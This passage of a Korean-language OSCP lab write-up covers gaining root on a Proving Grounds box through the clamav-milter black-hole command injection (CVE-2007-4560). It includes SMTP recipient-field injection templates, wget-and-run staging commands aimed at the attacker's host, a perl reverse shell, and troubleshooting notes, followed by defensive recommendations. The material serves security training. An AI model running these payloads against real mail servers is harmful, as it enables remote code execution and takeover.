```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.42] 32803
GET /p443 HTTP/1.0
User-Agent: Wget/1.9.1
Host: 192.168.45.207:443
Accept: */*
Connection: Keep-Alive
```

443 아웃바운드가 열려 있다는 건 확인됐다. 문제는 이 확인용 wget 이 끝나지 않고 큐에 남았다는 것이다. 이후 `cd /tmp;/bin/sh p.sh`(perl→443)를 세 번 보냈는데(try9·10·12) 세 번 다 셸이 안 붙었다.

`killall wget` 을 원격에서 돌려도(try11) 소용이 없었다. 나중에 셸에서 확인하니:

```
sh-2.05b# clear; ls -la /tmp; echo ---QUEUE---; ls -la /var/spool/mqueue | head
-20; echo ---PS---; ps aux | grep -c wget
---QUEUE---
total 20
drwxr-s---  2 smmta smmsp 4096 Aug 20 05:39 .
drwxr-xr-x  7 root  root  4096 Jan 21  2009 ..
-rw-r-----  1 root  smmsp   69 Aug 20 05:26 df67K9Q1G9004135
-rw-r-----  1 root  smmsp   69 Aug 20 05:29 df67K9Spbp004144
-rw-r-----  1 root  smmsp   69 Aug 20 05:29 df67K9TFC6004151
---PS---
4
```

큐에 3건이 남아 있고 wget 프로세스도 살아 있었다.

해결은 포트를 바꾼 것이다. `p.sh` 와 `q.sh` 는 포트(443 → 4444)만 다르고 나머지 바이트가 같은데, 4444 로 바꾸니 한 번에 붙었다. 스크립트가 아니라 포트가 변수였다는 뜻이다.

`[가정]` — 그 세 번이 "유령 wget 이 리스너를 먼저 소모해서" 실패했다는 인과는 완전히 입증되지 않았다. 그 시점의 443 리스너 로그가 남아 있지 않다. 다만 (a) 443 으로 재배달되는 wget 이 실재했고 (b) `nc -lvnp` 는 `-k` 없이는 연결 하나에 종료되며 (c) 스크립트가 동일한데 포트만 바꾸니 즉시 붙었다 — 이 셋이 같은 방향을 가리킨다.

배운 것 둘. 이 부류의 익스플로잇은 한 번 보낸 명령이 나중에 다시 실행될 수 있으니 확인용 명령이라도 부작용을 남기지 마라. 그리고 리스너가 안 붙으면 포트를 갈아보는 것이 방화벽을 의심하는 것보다 싸다.

### (3) `cd` 가 안 먹었고, 파일은 `/tmp` 가 아니라 milter 작업 디렉터리에 떨어졌다

가장 많은 시간을 먹은 지점이다. `cd /tmp;wget ...;/bin/sh /tmp/x.sh` 형태를 반복해서 던졌는데(try2·4·6) wget 은 매번 성공(HTTP 로그에 200)했지만 그 다음 `/bin/sh /tmp/x.sh` 는 조용히 아무것도 안 했다.

정리 단계에서 찾아보니 답이 나왔다:

```
sh-2.05b# clear; find / -maxdepth 4 \( -name "d.sh*" -o -name "q.sh*" -o -name "
p.sh*" -o -name "s.sh*" \) 2>/dev/null; echo ---PWD---; ls -la /var/lib/clamav 2
>/dev/null | head
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/s.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/p.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/d.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/q.sh
```

`cd /tmp` 는 효과가 없었고 파일은 전부 milter 의 메시지별 작업 디렉터리에 떨어졌다. `/tmp/x.sh` 는 존재한 적이 없고 상대경로 `x.sh` 가 맞아떨어진 것이다. 실제로 성공한 두 번(`cd /tmp;/bin/sh d.sh` = try8, `cd /tmp;/bin/sh q.sh` = try14)은 `cd` 가 무시된 덕분에 동작했다.

작업 디렉터리가 `/tmp/clamav-<hash>/` 라는 것 자체는 Metasploit 모듈 주석이 확인해준다(2장 콜아웃). 모듈이 `sh msg*` 라는 상대경로를 쓰는 이유가 그거다.

`[가정]` — `cd` 가 왜 무시되는지. `popen` 에 넘어가는 문자열이 셸에서 이렇게 갈리면 설명이 맞아떨어진다:

```
sendmail -bv "nobody+" | cd /tmp ; /bin/sh d.sh...
   └── 파이프라인 오른쪽 ──┘   └─ 별개 명령 ─┘
```

`;` 가 `|` 보다 결합이 약해서 파이프라인은 `sendmail ... | cd /tmp` 까지고, `cd` 는 파이프라인 구성원이라 서브셸에서 실행된 뒤 버려진다. 그 다음 `;` 부터가 별개 명령이라 cwd 는 milter 것 그대로다. 이 가설은 관측 넷을 전부 설명한다 — `cd` 무효, 상대경로 성공, 절대경로 무반응, `;` 체이닝 정상 동작(try16). 다만 마지막 조각에 `@localhost` 가 어떻게 처리되는지는 확인하지 못했다. sendmail 이 로컬 배달로 판정한 주소의 도메인부를 떼고 milter 에 넘긴다면 아귀가 맞지만, 그건 확인하지 않았다.

실무적 결론만 남긴다 — 이 채널에서는 `cd` 를 믿지 말고, 파일을 내려받았으면 어디에 떨어졌는지부터 확인하라. 절대경로가 항상 옳은 게 아니다.

### (4) 명령이 93자에서 잘린다

증거가 둘인데 성격이 다르다.

**보존된 쪽 — 지금도 재확인된다.** `try7` 은 105자짜리였다:

```
cd /tmp;/usr/bin/wget http://192.168.45.207/aaa;/bin/sh /tmp/d.sh;/usr/bin/wget http://192.168.45.207/zzz
```

세 번째 명령 `/usr/bin/wget .../zzz` 는 67번째 문자에서 시작한다. HTTP 로그에는 `GET /aaa` 만 찍히고 `GET /zzz` 는 없다. 93자에서 자르면 그 자리는 `/usr/bin/wget http://192.16` 이 되어 URL 이 깨지므로 관측과 맞는다. `~/PG/ClamAV/http_stager.log` 로 지금도 확인되는 절단 증거다.

**직접 계측한 쪽 — 로그를 못 남겼다.** URL 경로에 숫자 200자를 채워 229자를 보내고(`try15_lenprobe.log`), 내 HTTP 서버가 실제로 받은 경로 길이를 읽었다:

```
$ P=$(python3 -c "print('/usr/bin/wget 192.168.45.207/'+'0123456789'*20)")   # LEN=229
$ python3 clamex.py "$P"
```

살아 있는 tmux 페인에서 읽은 경로는 64자였다. 앞의 `/usr/bin/wget 192.168.45.207/` 29자를 더하면 실행된 명령은 93자다. 이 계측을 덮는 HTTP 서버 로그는 저장하지 않았다 — `http_stager.log` 는 14:34:53(`GET /q.sh`)에서 끝나고 try15 는 14:37 이다. 64라는 숫자 자체는 지금 재확인할 수 없고, 절단이 있다는 사실은 위 try7 로 재확인된다.

`;` 로 이어붙인 명령 자체는 정상이다 — 65자짜리 `wget .../one;wget .../two`(try16), 76자짜리 `cd /tmp;wget .../d.sh;wget .../after`(try17) 둘 다 문법상 문제가 없었다. 문제는 문법이 아니라 길이다.

실무 규칙: 이 채널에는 한 번에 한 단계씩 짧게 보낸다. 내려받기 한 번(41자), 실행 한 번(20자)으로 쪼개면 여유가 넉넉하다.

### (5) 소문자 접힘

(1)~(4)를 겪는 내내 배경으로 깔려 있던 제약이다. `PROBE1` → `probe1` 로 접힌 것을 첫 확인에서 봤기에 `wget -O /tmp/x` 를 처음부터 안 썼다. 이걸 못 봤으면 `-O` 가 `-o`(로그 파일 지정)로 바뀌어 파일이 안 만들어지는데 wget 은 성공한 것처럼 보이는 상황에 빠졌을 것이다.

### 시간

Kali(KST) 기준이다. 타겟 셸의 `date` 는 4시간 어긋나 있으니 대조하지 마라.

| 시각 | 사건 | 산출물 |
|---|---|---|
| 14:22:36 | 전 포트 nmap 시작(74.5초) · 14:22:43 top-200(1.03초) | `nmap.log`·`quick.log` |
| 14:22:55 | 6포트 `-sV -sC`(16.5초) | `svc.log` |
| 14:23:33 | SMTP 주소 문법 프로브 — 인용 local-part 가 `250 ok` | `smtp_probe1.txt` |
| 14:25:19 | 첫 발사 — EICAR 로 milter 확인 + `GET /probe1` 로 RCE 확정 + 소문자 접힘 발견 | `try1.log` |
| 14:26~14:31 | 스테이저 삽질 — 절대경로 실행이 계속 무반응 | `try2`~`try7` |
| 14:32:03 | 상대경로 `d.sh` 성공 → `uid=0-root` + 도구 인벤토리 | `try8`·`http_stager.log` |
| 14:32~14:34 | perl→443 세 번 실패, `killall wget` 시도 | `try9`~`try12` |
| 14:35:31 | 포트를 4444 로 바꾼 q.sh → root 대화형 셸 | `try14`·`shell_session.log` |
| 14:35:57 | 플래그 + `find / -name local.txt` 0건 | `shell_session.log` |
| 14:37~14:39 | 채널 계측 — 길이 상한·체이닝 | `try15`~`try17` |
| 14:41:47 | 흔적 정리 후 증거 한 화면 | `proof.txt` |
| 14:42~14:44 | tcp/80·SMB 뒤늦은 열거 | `http_root.txt`·`smb_shares.txt` |

**손절 기준**: 14:25 에 RCE 가 확정된 뒤로는 "붙느냐"가 아니라 "채널 제약이 뭐냐"의 문제였다. 이럴 때 리스너 포트를 바꿔가며 재시도하는 것보다 도구 인벤토리(3장 2단계)를 먼저 돌리는 게 빨랐다. 실제로 그걸 돌린 14:32 이후로는 3분 만에 끝났다.

## 7. OSCP 시험 관점

1. **MTA 는 배너로 끝내지 마라.** `EHLO` 응답과 EICAR 한 줄이면 뒤에 필터가 붙었는지 알 수 있고, 붙어 있으면 공격면이 통째로 바뀐다.
2. **블라인드 RCE 는 오라클부터 만든다.** 내 HTTP 서버 액세스 로그가 가장 싸다. `ping` 은 ICMP 가 막히면 안 되고 DNS 는 로그를 따로 띄워야 한다. `python3 -m http.server` 는 3초면 뜬다.
3. **셸을 던지기 전에 도구 인벤토리.** `which perl nc python socat` 한 번이 세 갈래 실패 원인을 미리 잘라낸다. 이 박스는 `nc`·`python`·`socat` 이 전부 없고 perl 만 있었다.
4. **자동 도구 없이 하는 법.** Metasploit 모듈(`exploit/unix/smtp/clamav_milter_blackhole`)이 있지만 쓰지 않았다. `clamex.py` 30줄이 전부고, 실은 `nc 타겟 25` 로 손으로 쳐도 된다:
   ```
   HELO x
   MAIL FROM: <>
   RCPT TO: <nobody+"|<명령>"@localhost>
   DATA
   .
   ```
   내려받기가 아예 안 되는 상황이라면 모듈이 쓰는 수법을 흉내내면 된다 — `From:` 헤더에 명령을 넣으면 그게 milter 작업 디렉터리에 `msg.XXXXXX` 로 먼저 쓰이므로, 주입할 명령을 `sh msg*` 로 두고 실제 페이로드를 헤더에 실을 수 있다. 이 박스에서는 시도하지 않았고, 근거는 모듈 소스 주석이다. Metasploit 은 시험에서 1대 한정이라 손으로 되는 건 손으로 하는 게 맞다.
5. **RCE 채널에는 제약이 붙는다는 것을 기본값으로 놔라.** 대소문자·길이·금지문자·cwd. 리버스셸이 안 붙으면 방화벽을 의심하기 전에 명령이 실행은 됐는지를 오라클로 먼저 확인한다. 이 박스에서 아웃바운드는 80·443·4444 전부 열려 있었고 문제는 전부 페이로드 쪽이었다.
6. **거절 응답이 실패를 뜻하지 않는다.** `554 virus detected` 를 받고도, `250 accepted` 를 받고도, 아무 응답이 없어도 명령은 실행됐다. 특히 무응답은 "명령이 아직 도는 중"이라는 신호로 읽어라. 같은 패턴이 [[Crane]]·[[RubyDome]]·[[Squid]] 에도 있다.
7. **`dpkg -l` 버전과 실제 실행 바이너리가 다를 수 있다.** 여기서는 패키지가 0.84 인데 `/usr/local/sbin` 의 0.91 이 돌고 있었다. `ps aux` 로 실행 경로를 보고 그 바이너리에 `--version` 을 물어라. 버전 판정 독립 근거 2개 원칙([[Hub]]·[[Levram]]·[[Squid]])이 여기서도 그대로다.
8. **시간 배분** — Fundamental 박스에서 15분 안에 RCE 가 나왔는데 셸이 안 붙으면 그건 경로 선택 문제가 아니라 페이로드 문제다. 다른 서비스(여기선 Samba·smux)로 눈을 돌리지 말고 채널을 계측하라.

## 8. 방어 관점

- clamav-milter 를 0.91.2 이상으로 올린다. 그게 안 되면 black hole 모드를 끈다 — 이 결함은 그 모드에서만 나온다. (NVD 는 `before 0.91.2`, Rapid7 모듈 설명은 `prior to v0.92.2` 라고 적는다. 어느 쪽이든 0.91 은 취약이다.)
- milter 를 root 로 돌리지 않는다. `clamav` 같은 전용 계정으로 돌렸다면 명령 주입이 나도 uid=0 은 안 됐다.
- 외부 입력을 셸 문자열에 이어붙여 `popen` 하지 않는다. 인자 배열로 `execve` 하면 이 결함은 성립하지 않는다.
- 2005년 배포판(Debian sarge, Apache 1.3.33, Samba 3.0.14a)이 노출돼 있는 것 자체가 근본 문제다. 이 박스는 milter 하나로 끝났지만 나머지도 전부 EOL 이다.

## 9. 참고 자료

- [CVE-2007-4560](https://nvd.nist.gov/vuln/detail/CVE-2007-4560) — clamav-milter black hole 모드 명령 주입
- Metasploit `exploit/unix/smtp/clamav_milter_blackhole` — 같은 취약점. 모듈 소스 주석이 milter 작업 디렉터리와 `msg.*` 동작을 설명한다. 시험에서는 1대 한정이므로 수동 절차(3장)를 먼저 익힐 것
- EICAR 테스트 문자열 — AV 동작 확인용 표준. 실제 악성코드가 아니다

## 남긴 흔적

타겟(192.168.248.42)에서 직접 확인하고 지운 것:
- `/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/` 의 `s.sh`·`p.sh`·`d.sh`·`q.sh` — 업로드한 스테이저 4개. `rm` 후 `ls` 로 빈 것 확인
- 같은 디렉터리의 `msg.UwrIn0`·`msg.bALJGx`·`msg.ltbt6h` — 내가 보낸 메일 본문. 삭제 확인
- `/var/spool/mqueue/df67K9Q1G9004135`·`df67K9Spbp004144`·`df67K9TFC6004151` — 큐에 남아 재배달되던 익스플로잇 메시지. 삭제 후 큐가 빈 것 확인

지우지 않은 것:
- `/var/mail/root` (2670바이트, mtime 이 작업 시각) — 내 메일 시도로 생긴 바운스가 들어 있다. root 메일함 자체를 지우는 건 원상복구가 아니라 파괴라 그대로 뒀다
- 설정 변경·계정 생성·백도어는 하지 않았다

Kali(10.44.44.128) 쪽:
- tmux `clamav_*` 세션 전부 종료 확인. 80/443/4444 리스너 없음(`ss -lntp`)
- 작업 종료 시점에 타겟이 응답하지 않는다(`Destination Host Unreachable`). 셸은 그때 이미 끊겼고, 재확인하려면 박스를 다시 켜고 3장을 처음부터 돌려야 한다. 그러면 플래그 값도 바뀐다
- 산출물: `~/PG/ClamAV/` — `nmap.log`·`nmap.full.txt`·`quick.log`·`svc.log`·`smtp_probe1.txt`·`clamex.py`·`www/{s,p,d,q}.sh`·`try1`~`try17`·`http_stager.log`·`listener443.log`·`shell_session.log`·`proof.txt`·`http_root.txt`·`web_binary_decoded.txt`·`smb_shares.txt`
- 저장하지 못한 것: try15~17 을 덮는 HTTP 서버 로그. tmux 페인에서만 읽고 파일로 안 남겼다

## 관련 노트

- [[Bratarina]] — 같은 SMTP 계열(OpenSMTPD). 거기서도 local-part 에 명령을 넣었고, 프로토콜이 `|` 를 재작성해 스테이저가 조용히 실패했다. **주소 필드 주입은 문자 제약을 먼저 계측하라**는 교훈이 양쪽에 겹친다
- [[Cockpit]] — 박스 이름을 믿고 판 함정. 여기서는 이름이 맞았지만, 맞은 것을 확인한 근거는 이름이 아니라 EICAR 응답이었다
- [[Hub]] · [[Levram]] · [[Squid]] — 버전 판정 독립 근거 2개
- [[Crane]] · [[RubyDome]] · [[Squid]] — 응답이 성공을 뜻하지 않는다
- [[Flu]] — 인스턴스마다 플래그가 새로 생성된다는 실측
- [[_STATUS]]
